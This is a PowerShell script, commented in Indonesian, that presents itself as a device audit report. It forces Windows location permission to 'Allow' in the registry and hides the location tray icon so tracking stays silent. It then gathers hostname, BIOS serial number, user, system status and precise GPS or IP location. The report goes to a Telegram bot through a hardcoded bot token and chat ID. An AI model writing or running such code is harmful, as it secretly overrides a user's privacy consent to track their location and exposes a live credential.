# --- KONFIGURASI TELEGRAM ---
$TelegramToken = "8717446156:AAGhWMtcY1HgArk-aVZCEXj1aco7E6FEBhY"
$TelegramChatID = "1229343863"

# --- [SELF-HEALING] PERBAIKAN IZIN LOKASI & SERVICE ---
try {
    # 1. Pastikan Service Geolocation Berjalan & Otomatis
    Set-Service -Name "lfsvc" -StartupType Automatic -ErrorAction SilentlyContinue
    $LocationService = Get-Service -Name "lfsvc" -ErrorAction SilentlyContinue
    if ($LocationService.Status -ne 'Running') { 
        Start-Service -Name "lfsvc" -ErrorAction SilentlyContinue 
    }

    # 2. Paksa Izin 'Allow' pada Registry (User & Machine level)
    $ConsentPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location"
    )
    foreach ($path in $ConsentPaths) {
        if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
        Set-ItemProperty -Path $path -Name "Value" -Value "Allow" -ErrorAction SilentlyContinue
    }

    # 3. Matikan Icon Lokasi di Tray (Agar tersembunyi/Silent)
    $PrivPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Privacy"
    if (-not (Test-Path $PrivPath)) { New-Item -Path $PrivPath -Force | Out-Null }
    Set-ItemProperty -Path $PrivPath -Name "LocationIconStatus" -Value 0 -ErrorAction SilentlyContinue
} catch {}

# --- CEK KONEKSI TELEGRAM ---
function Test-TelegramAccess {
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $connect = $tcpClient.BeginConnect("api.telegram.org", 443, $null, $null)
        if ($connect.AsyncWaitHandle.WaitOne(2000, $false)) {
            $tcpClient.EndConnect($connect); $tcpClient.Close(); return $true
        }
        return $false
    } catch { return $false }
}
if (-not (Test-TelegramAccess)) { exit }

# --- DATA DASAR ---
$Hostname = $env:COMPUTERNAME
$SN = (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber
$Expl = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction SilentlyContinue
$User = if ($Expl) { (Invoke-CimMethod -InputObject $Expl[0] -MethodName GetOwner).User } else { $env:USERNAME }

# 1. Resource Usage
$CPU = [Math]::Round((Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue, 1)
$RAM = Get-CimInstance Win32_OperatingSystem
$RAMUsage = [Math]::Round((($RAM.TotalVisibleMemorySize - $RAM.FreePhysicalMemory) / $RAM.TotalVisibleMemorySize) * 100, 1)
$DiskUsage = [Math]::Round((Get-Counter '\LogicalDisk(C:)\% Disk Time' -MaxSamples 1).CounterSamples.CookedValue, 1)
if ($DiskUsage -gt 100) { $DiskUsage = 100 }
$NetUsage = [Math]::Round(((Get-Counter '\Network Interface(*)\Bytes Total/sec' -ErrorAction SilentlyContinue).CounterSamples.CookedValue | Measure-Object -Sum).Sum / 1KB, 1)
try { $GPUUsage = [Math]::Round(((Get-Counter '\GPU Engine(*)\Utilization Percentage' -ErrorAction SilentlyContinue).CounterSamples.CookedValue | Measure-Object -Sum).Sum, 1) } catch { $GPUUsage = 0 }

# 2. LOGIKA BATTERY HEALTH
$BatteryString = "Desktop / N/A"
$ReportPath = "$env:TEMP\bat_audit.html"
try {
    powercfg /batteryreport /output $ReportPath | Out-Null
    Start-Sleep -Seconds 2
    if (Test-Path $ReportPath) {
        $Html = Get-Content $ReportPath -Raw
        $DMatch = [regex]::Match($Html, 'DESIGN CAPACITY.*?<td>([\d,.]+)\s*mWh')
        $FMatch = [regex]::Match($Html, 'FULL CHARGE CAPACITY.*?<td>([\d,.]+)\s*mWh')
        if ($DMatch.Success -and $FMatch.Success) {
            $DVal = [int]($DMatch.Groups[1].Value -replace '[,.]', '')
            $FVal = [int]($FMatch.Groups[1].Value -replace '[,.]', '')
            $Health = [math]::Round(($FVal / $DVal) * 100, 1)
            $BatCIM = Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue
            $Level = if ($BatCIM) { "$($BatCIM.EstimatedChargeRemaining)%" } else { "---" }
            $Status = if ($BatCIM.BatteryStatus -eq 2) { "🔌 Charging" } else { "🔋 Discharging" }
            $BatteryString = "$Level ($Status)`n   └ Health: $Health% ($FullCap / $DesignCap mWh)"
        }
        Remove-Item $ReportPath -Force -ErrorAction SilentlyContinue
 } else { $BatteryString = "Desktop (No Battery)" }
} catch { $BatteryString = "N/A" }

# 3. Storage Status
$DiskReport = ""
foreach ($Drive in "C:", "D:", "E:") {
    $Disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$Drive'" -ErrorAction SilentlyContinue
    if ($Disk) {
        $PF = [Math]::Round(($Disk.FreeSpace / $Disk.Size) * 100, 1)
        $Icon = if ($PF -lt 10) { "🔴" } else { "🟢" }
        $DiskReport += "$Icon *$Drive* $([Math]::Round($Disk.FreeSpace / 1GB, 1)) GB ($PF%)`n"
    }
}

# 4. PM Status & Uptime
try {
    $WinUpdate = Get-CimInstance Win32_QuickFixEngineering | Sort-Object InstalledOn -Descending | Select-Object -First 1
    $LastWinUpdate = if ($WinUpdate.InstalledOn) { $WinUpdate.InstalledOn.ToString("dd MMM yyyy") } else { "N/A" }
    $DefragLog = Get-WinEvent -FilterHashtable @{LogName='Application'; ID=258} -MaxEvents 1 -ErrorAction SilentlyContinue
    $LastDefrag = if ($DefragLog) { $DefragLog.TimeCreated.ToString("dd MMM yyyy") } else { "N/A" }
    $AV = Get-CimInstance -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction SilentlyContinue | Select-Object -First 1
    $AVName = if ($AV) { $AV.displayName } else { "Windows Defender" }
} catch { $LastWinUpdate = "N/A"; $LastDefrag = "N/A"; $AVName = "N/A" }
$Uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$UptimeString = "{0} Hari, {1} Jam, {2} Menit" -f $Uptime.Days, $Uptime.Hours, $Uptime.Minutes

# 5. LOGIKA LOKASI (HYBRID)
Add-Type -AssemblyName System.Device -ErrorAction SilentlyContinue
$Watcher = New-Object System.Device.Location.GeoCoordinateWatcher(1)
$Watcher.Start()
for ($i=0; $i -lt 30; $i++) { if ($Watcher.Position.Location.IsUnknown) { Start-Sleep -Milliseconds 500 } else { break } }
$Loc = $Watcher.Position.Location
if (!$Loc.IsUnknown -and $Loc.HorizontalAccuracy -gt 0) {
    $Lat = $Loc.Latitude.ToString().Replace(",", "."); $Lon = $Loc.Longitude.ToString().Replace(",", "."); $Acc = [Math]::Round($Loc.HorizontalAccuracy, 1)
} else {
    try {
        $IpInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/" -TimeoutSec 5
        $Lat = $IpInfo.lat.ToString().Replace(",", "."); $Lon = $IpInfo.lon.ToString().Replace(",", "."); $Acc = "Approx (IP)"
    } catch { $Acc = "N/A"; $Lat = "0"; $Lon = "0" }
}
$Watcher.Stop()
$MapsLink = "https://www.google.com/maps?q=$Lat,$Lon"

# --- PENYUSUNAN PESAN (SUSUNAN TETAP) ---
$Timestamp = Get-Date -Format "yyyy-MM-dd | HH:mm:ss"
$Message = "📍 *AUDIT DEVICE REPORT*`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "💻 *Hostname:* $Hostname`n" +
           "🔢 *Serial Number:* $SN`n" +
           "👤 *User:* $User`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "📊 *RESOURCE USAGE:*`n" +
           "📟 *CPU:* $CPU % `n" +
           "⚡ *RAM:* $RAMUsage %`n" +
           "📁 *Disk:* $DiskUsage %`n" +
           "🔋 *Battery:* $BatteryString`n" +
           "📶 *Network:* $NetUsage Kbps`n" +
           "🎨 *GPU:* $GPUUsage %`n" +
           "⏱️ *Uptime:* $UptimeString`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "💾 *SPACE STORAGE STATUS:*`n$DiskReport" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "⚙️ *PM STATUS:*`n" +
           "🛡️ *AV:* $AVName`n" +
           "📅 *AV Update:* $(Get-Date -Format 'dd MMM yyyy')`n" +
           "🔄 *Win Update:* $LastWinUpdate`n" +
           "🧹 *Last Defrag:* $LastDefrag`n" +
           "🎯 *Location Accuracy:* $Acc meter`n" +
           "⏰ *Report Sent:* $Timestamp`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "🔗 [Device location]($MapsLink)"

# --- KIRIM ---
$Payload = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = "Markdown" }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$($TelegramToken)/sendMessage" -Method Post -Body $Payload -TimeoutSec 15
